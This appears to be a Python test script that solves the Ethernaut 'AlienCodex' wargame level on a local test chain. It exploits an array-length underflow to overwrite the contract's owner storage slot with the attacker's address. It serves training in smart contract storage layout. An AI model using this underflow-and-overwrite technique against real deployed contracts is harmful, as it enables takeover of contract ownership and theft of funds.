from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv19_alien_code import AlienCodex
from pytypes.contracts.attacker.lv19_underflow_calculator import UnderflowCalculator

@default_chain.connect()
def test_lv19():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv19()
    exploit_lv19(contract)
    ethernaut.check_lv19(contract)

def exploit_lv19(contract: AlienCodex):
    # Attack vector: underflow in array.length 
    # Training: understanding of storage layouts of smart contracts and how memory is allocated for arrays

    exploitContract = UnderflowCalculator.deploy()
    index = exploitContract.calculateTheZeroIndex()
    myAddress = exploitContract.calculateMyAddressInBytes(from_=default_chain.accounts[1].address)
    
    contract.makeContact()
    contract.retract()
    contract.revise(index, myAddress)
